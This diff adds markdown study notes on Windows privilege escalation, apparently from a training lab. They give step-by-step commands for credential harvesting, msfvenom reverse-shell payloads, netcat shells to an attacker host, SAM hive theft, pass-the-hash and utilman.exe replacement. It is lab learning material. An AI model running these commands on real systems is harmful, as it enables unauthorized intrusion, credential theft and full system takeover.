@@ -1,0 +1,143 @@
+## *Harvesting Passwords From Usual Spots*
+- Gather credentials from compromised machine, such credentials could exist for many reasons, including careless user leaving them around in plaintext files, or even stored by some software like browsers or email clients.
+- #### *Unattended Windows Installations*
+	- When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows single operating system image to be deployed to several hosts through the network.
+	- Since these installations don't require user interaction they are called Unattended Installations.
+	- These require administrator account to perform the initial setup, which might end up being stored in the machine in 
+		- `C:\Unattend.xml`
+		- `C:\Windows\Panther\Unattend.xml`
+		- `C:\Windows\Panther\Unattend\Unattend.xml`
+		- `C:\Windows\system32\sysprep.inf`
+		- `C:\Windows\system32\sysprep\sysprep.xml`
+	- As part of these files, might encounter the credentials used.
+- #### *Powershell History*
+	- Whenever a user runs a command in Powershell it gets stored in a file.
+		- It can be retrieved from CMD using `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`.
+	- It can be retrieved from Powershell using `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`.
+- #### *Saved Windows Credentials*
+	- Windows allow us to use other user's credentials, this function also gives us the option to save these credentials on the system.
+	- List the saved credentials using `cmdkey /list`.
+	- `runas /savecred /user:admin cmd.exe` to use the found credentials.
+- #### *IIS Configuration*
+	- Internet Information Service is the default web server on Windows.
+	- The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms.
+	- Depending on the installed version of IIS, the config file can be found in the following locations
+		- `C:\inetpub\wwwroot\web.config`
+		- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
+	- Find database connection string on the file using `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
+- #### *Retrieve Credentials From Software: PuTTY*
+	- PuTTY is an SSH client found in Windows systems. Connection parameters such as IP, user, and others can be stored for later use.
+	- While PuTTY won't allow users to save SSH passwords, it will store proxy configurations that include cleartext authentication credentials.
+	- To retrieve the stored proxy credentials, search under the registry key for ProxyPassword using `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`, Simon Tatham is the creator of PuTTY not the username.
+## *Misconfigurations*
+- Consider these to belong to the realm of CTF events rather than scenarios to be encountered in real penetration testing engagements, however, this can always happen.
+- #### *Scheduled Tasks*
+	- Some scheduled tasks could have lost its binary or its binary is modifiable by you.
+	- List Scheduled Tasks using `schtasks`.
+	- Retrieve detailed information about any of the services using `schtasks /query /tn <vuln-task> /fo list /v`, the interesting parameters that will be shown after running this are `Task to Run` which indicates what gets executed, and `Run As User` which shows the user that will be used to execute the task.
+	- If the current user can modify the `Task to Run` executable, we can control what gets executed.
+	- Check file permissions on the executable using `icacls`.
+		- Start a listener on the attacking machine using `nc -lvnp 4444`.
+		- Open a reverse shell using `echo <payload-exe-file> -e cmd.exe <attack-ip> 4444 > <path-to-modifiable-exe>`.
+		- Normally you would have to wait for the scheduled task to run, and not be able to run it yourself, but use `schtasks /run /tn <vuln-task>`.
+- #### *AlwaysInstallElevated*
+	- Windows installer files (.msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it.
+	- However, these can be configured to run with higher privileges from any user account. This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
+	- This method requires two registry values to be set, `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` and `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
+	- Generate a malicious MSI file using `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`.
+	- As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. After transferring the MSI file created, run the installer using `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi` to receive the shell.
+## *Service Misconfigurations*
+- Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally provide a way to configure services.
+- Each service will have an associated executable which will be run by the SCM whenever the service starts. These service executables implement special functions to communicate with the SCM, and therefore not any executable can be started as a service successfully.
+- Each service also specifies the user account under which the service will run.
+- Check the service using `sc qc <service>`.
+- Services have a Discretionary Access Control List (DACL), which indicates who has permissions to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen through properties.
+- All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`.
+- A subkey exist for every service in the system.
+- #### *Insecure Permissions on Service Executable*
+	- If the executable associated with a service has weak permissions that allow the attacker to modify or replace it, the attacker can gain the privileges of the service's account easily.
+	- **Steps**
+		- Query the service using `sc qc <service-name>` make note of the `BINARY_PATH_NAME` which gives the path of the executable and `SERVICE_START_NAME` which shows the user that the service uses.
+		- Get the permissions of the executable using `icacls <path-to-exe>`
+		- Generate an exe-service payload using `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o rev-svc.exe`.
+		- Serve the generated file using an python web server `python3 -m http.server`.
+		- From the target machine, download the file using `wget http://<attacker-ip>:8000/rev-svc.exe -O rev-svc.exe`.
+		- Replace the executable file with the generated payload using 
+			- `move <exe-file> <exe-file>.exe.bkp`
+			- `move <payload> <exe-file-name>`
+			- `icacls <exe-file-name> /grant Everyone:F` to give full permissions to everyone.
+		- Start a reverse listener on the attack machine using `nc -lvnp 4444`.
+	- **NOTE**
+		- **In PowerShell, the command `sc` is an alias for `Set-Content`, therefore use `sc.exe` to control services if you are in a PowerShell prompt**
+- #### *Unquoted Service Paths*
+	- When we can directly write to service executables as before, there might be a chance to force a service into running arbitrary executables.
+	- When working with Windows Services, a particular behavior occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
+	- For example, the executable file path `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` if not contained in quotation marks, could be interpreted as either of the following. ![](unquoted-service-path.png)
+	- SCM tries to help the user by searching for these different interpretations by order and if any of them is found, it executes it.
+	- So, if an attacker creates a `Disk.exe` file they will force the service to run the malicious executable rather than the actual one.
+	- While this looks easy, but most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users.
+	- In some cases, the installers change the permission on the installed folders making the service vulnerable, and sometimes an administrator decides to install the service binaries in a non-default path, and if this path is world-writable, the vulnerability can be exploited.
+	- **Steps**
+		- Query the service using `sc qc <service-name>` make note of the `BINARY_PATH_NAME` which gives the path of the executable and `SERVICE_START_NAME` which shows the user that the service uses.
+		- Get the permissions of the executable using `icacls <path-to-exe>`
+		- Generate an exe-service payload using `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o rev-svc2.exe`.
+		- Serve the generated file using an python web server `python3 -m http.server`.
+		- From the target machine, download the file using `wget http://<attacker-ip>:8000/rev-svc2.exe -O rev-svc2.exe`.
+		- Start a reverse listener on the attack machine using `nc -lvnp 4444`.
+		- Move the payload to the location of the service binaries using`move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe`.
+		- `icacls <exe-file-name> /grant Everyone:F` to give full permissions to everyone.
+		- Restart the service using `sc stop "disk sorter enterprise"` and then `sc start "disk sorter enterprise"`.
+- #### *Insecure Service Permissions*
+	- Might have a chance of taking an advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted.
+	- Should the service's DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service.
+	- This allows you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
+	- Use the [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the `Sysinternals` suite to check for a service DACL  `accesschk64.exe -qlc <service-name>`.
+	- **Steps**
+		- Use `accesschk64.exe -qlc <service-name>` to check the DACL of the service.
+		- Generate an exe-service payload using `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o rev-svc3.exe`.
+		- Serve the generated file using an python web server `python3 -m http.server`.
+		- Start a reverse listener on the attack machine using `nc -lvnp 4444`.
+		- From the target machine, download the file using `wget http://<attacker-ip>:8000/rev-svc3.exe -O rev-svc3.exe`.
+		- Move the payload to any location.
+		- `icacls <exe-file-name> /grant Everyone:F` to give full permissions to everyone.
+		- Change the service's associated executable and account with `sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem`.
+		- Restart the service using `sc stop THMService` and then `sc start THMService`.
+## *Dangerous Privileges*
+- Check privileges of user using `whoami /priv`.
+- A list of exploitable privileges can be found on [Priv2Admin](https://github.com/gtworek/Priv2Admin).
+- #### *SeBackup / SeRestore*
+	- The SeBackup and SeRestore privileges allow users to read and write to any file in the system ignoring any DACL.
+	- These were created to allow certain users to perform backups from a system without full administrative privileges.
+	- Many techniques could abuse this to escalate privileges, one of which is by copying the SAM and SYSTEM registry hives to extract the local administrator's password hash.
+	- Backup the SAM and SYSTEM hashes using `reg save hklm\system C:\Users\THMBackup\system.hive` and `reg save hklm\sam C:\Users\THMBackup\sam.hive`.
+	- Copy these files using any transfer method, like using impacket's `smbserver.py` to start a simple SMB server.
+		- Create a folder on attacking machine, here named `share`.
+		- Share it using `python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share`, this will create a share named public pointing to the `share` directory.
+		- Use `copy C:\Users\THMBackup\sam.hive \\attack-ip\public\` and `copy c:\Users\THMBackup\system.hive \\attack-ip\public\` to transfer the files.
+	- Use `python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL` to retrieve the user's password hashes.
+	- Using the found Administrator hash, perform a Pass-the-Hash attack to gain access `python3 /opt/impacket/examples/psexec.py -hashes <admin-hash> administrator@<ip>`.
+- #### *SeTakeOwnership*
+	- This privilege allows a user to take ownership of any object on the system, including files and registry keys.
+	- For example, we could search for a service running as SYSTEM and take ownership of the service's executable.
+	- Abusing `utilman.exe` which is a built-in Windows application used to provide Ease of Access options during lock screen.
+		- Take ownership of `utilman.exe` using `takeown /f C:\Windows\System32\Utilman.exe`.
+		- Being the owner of a file doesn't necessarily mean that you have privileges over it, but you can assign yourself any privilege you need.
+		- Give full permissions over `utilman.exe` using `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`.
+		- Replace the `utilman.exe` with a copy of `cmd.exe` using `copy cmd.exe utilman.exe`.
+		- To trigger `utilman`, lock the screen and click on the "Ease of Access" button which runs `utilman.exe` with SYSTEM privileges.
+- #### *SeImpersonate / SeAssignPrimaryToken*
+	- These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
+	- In Windows systems, LOCAL SERVICE AND NETWORK SERVICE ACCOUNTS already has these privileges since these accounts are used to spawn services using restricted accounts.
+	- Internet Information Service (IIS) will also create a similar default account called `iis apppool\defaultapppool` for web applications.
+	- To elevate privileges using such accounts
+		- Spawn a process so that users can connect and authenticate to it for impersonation to occur.
+		- Find a way to force privileged users to connect and authenticate to the spawned malicious process.
+	- Use `RogueWinRM` found [here](https://github.com/antonioCoco/RogueWinRM) to accomplish both conditions above.
+		- The `RogueWinRM` exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges.
+		- Port 5985 is typically used for the WinRM service, which is simply a port that exposes a PowerShell console to be used remotely through the network (like SSH but using PowerShell).
+		- If for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting.
+		- And if the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.
+	- Before exploiting run a netcat listener using `nc -lvnp 4442`.
+	- Use the Web shell to trigger the `RogueWinRM` exploit using `RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <attacker-ip> 4442`.
+		- `-p` specifies the executable to be run by the exploit, which is `nc64.exe` in this case.
+		- `-a` used to pass arguments to the executable. Since we want the `nc64` to establish a reverse shell against our attacker machine, the argument to pass to netcat will be `-e cmd.exe <attacker-ip> 4442`.
